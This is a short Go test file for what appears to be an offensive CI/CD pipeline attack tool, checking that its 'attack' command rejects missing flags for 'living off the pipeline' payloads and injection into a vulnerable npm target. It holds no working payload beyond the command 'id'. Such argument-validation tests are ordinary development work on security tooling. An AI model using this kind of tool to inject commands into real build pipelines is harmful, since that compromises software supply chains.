func TestAttack_PayloadOnly_LOTP_MissingCmd(t *testing.T) {
	_, _, err := runGogatoz(t, "", "attack",
		"--payload-only", "--payload", "lotp-gyp",
		// no --cmd
	)
	if err == nil {
		t.Fatal("expected error when --cmd is missing for LOTP payload")
	}
}

func TestAttack_LOTPInject_MissingTool(t *testing.T) {
	tok := requireCreds(t)
	_, _, err := runGogatoz(t, tok,
		"attack", "--target", vulnLOTPNpm,
		"--lotp-inject",
		"--cmd", "id",
		// no --lotp-tool
	)
	if err == nil {
		t.Fatal("expected error when --lotp-tool is missing for --lotp-inject")
	}
}
